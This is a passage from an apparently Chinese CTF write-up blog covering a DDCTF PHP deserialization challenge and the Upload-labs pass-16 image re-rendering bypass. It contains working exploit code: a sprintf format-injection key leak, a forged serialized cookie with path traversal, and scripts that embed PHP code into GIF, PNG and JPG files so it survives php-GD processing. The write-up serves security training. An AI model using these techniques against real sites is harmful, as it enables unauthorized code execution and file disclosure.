,</span><br><span class="line"><span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line"><span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line"><span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">//基于你真实的ip和ua设置一个数组$userdata</span></span><br><span class="line"> </span><br><span class="line">$cookiedata = serialize($userdata); <span class="comment">//把$userdata数组序列化后赋值给$cookiedata</span></span><br><span class="line">$cookiedata = $cookiedata . md5(<span class="keyword">$this</span>-&gt;eancrykey . $cookiedata); <span class="comment">//然后在$userdata前面加上eancrykey后md5加密赋值给$cookiedata</span></span><br><span class="line">$expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time(); <span class="comment">//7200加上当前时间戳赋值给$expire</span></span><br><span class="line">setcookie(<span class="keyword">$this</span>-&gt;cookie_name, $cookiedata, $expire, <span class="keyword">$this</span>-&gt;cookie_path, <span class="keyword">$this</span>-&gt;cookie_domain, <span class="keyword">$this</span>-&gt;cookie_secure);</span><br><span class="line"><span class="comment">//设置cookie： cookie_name,cookiedata,expire</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index(); <span class="comment">//开始</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="利用源码"><a href="#利用源码" class="headerlink" title="利用源码"></a>利用源码</h3><p>主要逻辑在这么几个地方：</p><p>控制$path变量，读取flag文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path); <span class="comment">// 不为空就调用sanitizepath()做替换</span></span><br><span class="line"><span class="keyword">if</span> (strlen($path) !== <span class="number">18</span>) &#123; <span class="comment">//如果处理过的$path长度不严格等于18，就跳出</span></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;response($data = file_get_contents($path) , <span class="string">'Congratulations'</span>); </span><br><span class="line"><span class="comment">//读出$path路径下的文件，并且用response()回显</span></span><br></pre></td></tr></table></figure><p>修改$session值，通过反序列化漏洞重写$path成员变量，使其为<code>flag.txt</code>所在路径。</p><p>那么需要满足<code>Cookie内ddctf_id的内容的后32位 === md5（密钥.去除摘要后的内容）</code></p><p>所以我们要得到密钥<code>$this-&gt;eancrykey</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$hash = substr($session, strlen($session) - <span class="number">32</span>); <span class="comment">//$hash = $session的后32位</span></span><br><span class="line">$session = substr($session, <span class="number">0</span>, strlen($session) - <span class="number">32</span>); <span class="comment">//去除$session的后32位校验</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"hash: $hash&lt;br&gt;session: $session"</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey . $session)) &#123;</span><br><span class="line">    <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>, <span class="string">'error'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125; <span class="comment">//如果ddctf_id的内容的后32位不等于 md5(密钥 + 去除最后32位校验后ddctf_id的内容)，返回False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$session = unserialize($session); <span class="comment">//**反序列化** $path变量控制点</span></span><br></pre></td></tr></table></figure><p>然后寻找到一处蜜汁代码，利用<code>sprintf格式化注入</code>即可达到目的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line">        $_POST[<span class="string">"nickname"</span>],</span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">$data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;<span class="comment">//遍历数组arr的每一个键名存入$k,键值存入$v</span></span><br><span class="line">    $data = sprintf($data, $v);<span class="comment">//蜜汁操作，存在sprintf格式化注入</span></span><br><span class="line">    <span class="comment">//post nickname=%s 获取key.txt内容</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">parent</span>::response($data, <span class="string">"Welcome"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这里简单介绍下原理：</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">已知 $arr=("sketch_pl4ne[%s]", $secret_key); $data = "Wlecome my friend %s";</span></span><br><span class="line"><span class="comment">那么 foreach($arr as $k =&gt; $v)&#123;$data = sprintf($data, $v);&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第一次：$data = sprintf("Wlecome my friend %s", $v1) = "Wlecome my friend sketch_pl4ne[%s]"</span></span><br><span class="line"><span class="comment">第二次：$data = sprintf("Wlecome my friend sketch_pl4ne[%s]", $v2) = "Wlecome my friend </span></span><br><span class="line"><span class="comment">sketch_pl4ne[$secret_key]";</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">所以POST的nickname中含有%s，即可获得密钥$this-&gt;eancrykey</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>在session_creat()中注意，Cookie中的字段内容都是经过序列化操作的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$userdata = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid, <span class="keyword">TRUE</span>)) ,</span><br><span class="line"><span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line"><span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line"><span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">);</span><br><span class="line">        <span class="comment">//基于你真实的ip和ua设置一个数组$userdata</span></span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata); <span class="comment">//把$userdata数组序列化后赋值给$cookiedata</span></span><br><span class="line">        $cookiedata = $cookiedata . md5(<span class="keyword">$this</span>-&gt;eancrykey . $cookiedata);</span><br></pre></td></tr></table></figure><p>在session_read()中结合index()，我们注意到只需要满足<code>$session = unserialize($session);</code>之前的判断条件，就可以反序列化达到目的，后面的代码条件并没有必要满足。</p><p>于是我们构造poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    class Application()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> $path = <span class="string">'..././config/flag.txt'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = <span class="keyword">new</span> Application();</span><br><span class="line">    $payload = serialize($payload);</span><br><span class="line">$payload = $payload.md5(<span class="string">"EzblrbNS"</span>.$payload);</span><br><span class="line"><span class="keyword">echo</span> urlencode($payload);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>自己在本地跑一下，得到<code>ddctf_id</code>的内容，Get flag</p><p><img src="https://i.loli.net/2019/07/07/5d20e3c1ce9d880929.png" alt="2.png"></p><h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p>这道题挂了，白费我一上午时间，我还以为是有什么我不知道的<code>sao</code>操作，淦。</p><p>考察点在于<code>php-GD</code>库二次渲染绕过 ，相当于<code>Upload-labs</code>的<code>pass-16</code>的一部分，所以这里我写一下pass-16的题解。</p><h3 id="上传gif图片马"><a href="#上传gif图片马" class="headerlink" title="上传gif图片马"></a>上传gif图片马</h3><p>直接在gif文件尾部写入php语句，上传之后下载回来，发现写入的代码没了，所以不能直接写入。</p><p>那我们先上传一张正常的<code>pre.gif</code>上去，再把渲染过的图片下载下来，用<code>winhex</code>对比一下：</p><p><img src="https://i.loli.net/2019/07/09/5d24758d445e158993.png" alt="1.png"></p><p>白色表示相同的部分，可以看出尽管被压缩了，但是还是有一部分是相同的，我们在相同的地方插入代码：<code>&lt;?php phpinfo();?&gt;</code></p><p>因为可能不小心损坏了文件头导致上传失败，多fuzz几下就上传成功了，然后下载下来验证图片马是否写入成功：</p><p><img src="https://i.loli.net/2019/07/09/5d24758d2ecde12075.png" alt="2.png"></p><p><strong><em>写入成功 ~</em></strong></p><h3 id="上传png图片马"><a href="#上传png图片马" class="headerlink" title="上传png图片马"></a>上传png图片马</h3><p>png格式的图片相对gif要复杂些，想要插入php语句的话，我们需要先了解png图片格式。</p><h4 id="png文件组成"><a href="#png文件组成" class="headerlink" title="png文件组成"></a>png文件组成</h4><p>png文件由文件头+数据块的形式组成。可形象地描述为：png格式 = <code>89 50 4E 47 0D 0A 1A 0A</code>（文件头）+ 数据块 + 数据块 + 数据块……</p><h4 id="chunk数据块"><a href="#chunk数据块" class="headerlink" title="chunk数据块"></a>chunk数据块</h4><p>png定义了两种类型的数据块，一种是称为关键数据块（critical chunk），这是标准的数据块，另一种叫做辅助数据块（ancillary chunks），这是可选的数据块。关键数据块中定义了三个标准数据块(IHDR, IDAT, IEND)，每个png文件都必须包含它们。</p><table><thead><tr><th>数据块符号</th><th>数据块名称</th><th>多数据块</th><th>可选否</th><th>位置限制</th></tr></thead><tbody><tr><td>IHDR</td><td>文件头数据块</td><td>否</td><td>否</td><td>第一块</td></tr><tr><td>cHRM</td><td>基色和白色点数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>gAMA</td><td>图像γ数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>sBIT</td><td>样本有效位数据块</td><td>否</td><td>是</td><td>在PLTE和IDAT之前</td></tr><tr><td>PLTE</td><td>调色板数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>bKGD</td><td>背景颜色数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>hIST</td><td>图像直方图数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>tRNS</td><td>图像透明数据块</td><td>否</td><td>是</td><td>在PLTE之后IDAT之前</td></tr><tr><td>oFFs</td><td>(专用公共数据块）</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>pHYs</td><td>物理像素尺寸数据块</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>sCAL</td><td>(专用公共数据块）</td><td>否</td><td>是</td><td>在IDAT之前</td></tr><tr><td>IDAT</td><td>图像数据块</td><td>是</td><td>否</td><td>与其他IDAT连续</td></tr><tr><td>tIME</td><td>图像最后修改时间数据块</td><td>否</td><td>是</td><td>无限制</td></tr><tr><td>tEXt</td><td>文本信息数据块</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>zTXt</td><td>压缩文本数据块</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>fRAc</td><td>(专用公共数据块）</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFg</td><td>(专用公共数据块）</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFt</td><td>(专用公共数据块）</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>gIFx</td><td>(专用公共数据块）</td><td>是</td><td>是</td><td>无限制</td></tr><tr><td>IEND</td><td>图像结束数据</td><td>否</td><td>否</td><td>最后一个数据块</td></tr></tbody></table><h4 id="数据块结构"><a href="#数据块结构" class="headerlink" title="数据块结构"></a>数据块结构</h4><table><thead><tr><th>名称</th><th>字节数</th><th>说明</th></tr></thead><tbody><tr><td>Length（长度）</td><td>4字节</td><td>指定数据块中数据域的长度，其长度不超过（231－1）字节</td></tr><tr><td>Chunk Type Code（数据块类型码）</td><td>4字节</td><td>数据块类型码由 ASCII 字母（A - Z 和 a - z）组成</td></tr><tr><td>Chunk Data（数据块数据）</td><td>可变长度</td><td>存储按照 Chunk Type Code 指定的数据</td></tr><tr><td>CRC（循环冗余检测）</td><td>4字节</td><td>存储用来检测是否有错误的循环冗余码</td></tr></tbody></table><p>其中的CRC是循环冗余校验码，主要用于检测是否有错误的编码，只能检错，不能像海明校验码一样纠错。</p><h4 id="IHDR"><a href="#IHDR" class="headerlink" title="IHDR"></a>IHDR</h4><p>文件头数据块，在CTF中常见的修改图片宽高就是修改这前八个字节，分别对应宽和高。</p><p>由于存在CRC校验码，直接修改宽高可能会显示错误，这时候可以写脚本爆破出需要修改的宽或者高。</p><h4 id="PLTE"><a href="#PLTE" class="headerlink" title="PLTE"></a>PLTE</h4><p>调色板数据块(辅助数据块)，对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致png图像不合法。</p><h4 id="IDAT"><a href="#IDAT" class="headerlink" title="IDAT"></a>IDAT</h4><p>图像数据块，这里储存了图片实际的数据内容。</p><h4 id="IEND"><a href="#IEND" class="headerlink" title="IEND"></a>IEND</h4><p>图像结束数据块，png图像总是以图像结束数据块结尾：<code>00 00 00 00 49 45 4E 44 AE 42 60 82</code></p><h4 id="写入php代码"><a href="#写入php代码" class="headerlink" title="写入php代码"></a>写入php代码</h4><p><strong>法一</strong>：因为FLTE数据块主要采用CRC校验码验证完整性，所以这里可以尝试在PLTE数据块插入语句，然后用脚本生成CRC校验码，笔者这里没有找到含有FLTE数据块的png格式图片，这里贴一下原作者<strong>@Yang</strong>的图片以及脚本：</p><p>写入FLTE数据块</p><p><img src="https://i.loli.net/2019/07/09/5d24758d45b8099324.png" alt="3.png"></p><p>CRC生成脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">png = open(<span class="string">r'2.png'</span>,<span class="string">'rb'</span>)</span><br><span class="line">a = png.read()</span><br><span class="line">png.close()</span><br><span class="line">hexstr = binascii.b2a_hex(a)</span><br><span class="line"></span><br><span class="line"><span class="string">''' PLTE crc '''</span></span><br><span class="line">data =  <span class="string">'504c5445'</span>+ re.findall(<span class="string">'504c5445(.*?)49444154'</span>,hexstr)[<span class="number">0</span>]</span><br><span class="line">crc = binascii.crc32(data[:<span class="number">-16</span>].decode(<span class="string">'hex'</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line"><span class="keyword">print</span> hex(crc)</span><br></pre></td></tr></table></figure><p><strong>法二</strong>：国外大牛的脚本一把梭……</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'./1.png'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用方法：<code>php png_payload.php xxx.png</code></p><p>将生成图片<code>1.png</code>上传，然后验证是否成功</p><p><img src="https://i.loli.net/2019/07/09/5d24758d1c93e27172.png" alt="4.png"></p><p><strong><em>写入成功~</em></strong></p><h3 id="上传jpg格式图片马"><a href="#上传jpg格式图片马" class="headerlink" title="上传jpg格式图片马"></a>上传jpg格式图片马</h3><p>这个就是DDCTF这次的题目，方法大致有两种。</p><p><strong>法一</strong>：比较图片，fuzz插入php代码，参考上传gif图片马。</p><p><strong>法二</strong>：国外大牛脚本一把梭……</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    /*</span><br><span class="line"></span><br><span class="line">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() <span class="keyword">and</span> imagecopyresampled().</span><br><span class="line">    It <span class="keyword">is</span> necessary that the size <span class="keyword">and</span> quality of the initial image are the same <span class="keyword">as</span> those of the processed image.</span><br><span class="line"></span><br><span class="line">    <span class="number">1</span>) Upload an arbitrary image via secured files upload script</span><br><span class="line">    <span class="number">2</span>) Save the processed image <span class="keyword">and</span> launch:</span><br><span class="line">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="line"></span><br><span class="line">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="line"></span><br><span class="line">    Since the most straightforward injection method <span class="keyword">is</span> used, the following problems can occur:</span><br><span class="line">    <span class="number">1</span>) After the second processing the injected data may become partially corrupted.</span><br><span class="line">    <span class="number">2</span>) The jpg_payload.php script outputs <span class="string">"Something's wrong"</span>.</span><br><span class="line">    If this happens, <span class="keyword">try</span> to change the payload (e.g. add some symbols at the beginning) <span class="keyword">or</span> <span class="keyword">try</span> another initial image.</span><br><span class="line"></span><br><span class="line">    Sergey Bobrov @Black2Fan.</span><br><span class="line"></span><br><span class="line">    See also:</span><br><span class="line">    https://www.idontplaydarts.com/<span class="number">2012</span>/<span class="number">06</span>/encoding-web-shells-<span class="keyword">in</span>-png-idat-chunks/</span><br><span class="line"></span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">"&lt;?=phpinfo();?&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">        die(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!isset($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        die(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = new DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = TRUE;</span><br><span class="line"></span><br><span class="line">        if($dis-&gt;readShort() != 0xFFD8) &#123;</span><br><span class="line">            die(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - 2;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                    $miniPayload . </span><br><span class="line">                    str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize) . </span><br><span class="line">                    substr($outStream, $startPos);</span><br><span class="line">                checkImage(<span class="string">'_'</span>.$argv[<span class="number">1</span>], $outStreamTmp, TRUE);</span><br><span class="line">                <span class="keyword">if</span>($extraBytes !== <span class="number">0</span>) &#123;</span><br><span class="line">                    while((!$dis-&gt;eof())) &#123;</span><br><span class="line">                        if($dis-&gt;readByte() === 0xFF) &#123;</span><br><span class="line">                            if($dis-&gt;readByte !== 0x00) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $stopPos = $dis-&gt;seek() - 2;</span><br><span class="line">                    $imageStreamSize = $stopPos - $startPos;</span><br><span class="line">                    $outStream = </span><br><span class="line">                        substr($outStream, <span class="number">0</span>, $startPos) . </span><br><span class="line">                        $miniPayload . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">"\0"</span>,$nullbytePayloadSize).</span><br><span class="line">                                substr($outStream, $startPos, $imageStreamSize),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . </span><br><span class="line">                                substr($outStream, $stopPos);</span><br><span class="line">                &#125; elseif($correctImage) &#123;</span><br><span class="line">                    $outStream = $outStreamTmp;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">'payload_'</span>.$argv[<span class="number">1</span>], $outStream)) &#123;</span><br><span class="line">                    die(<span class="string">'Success!'</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    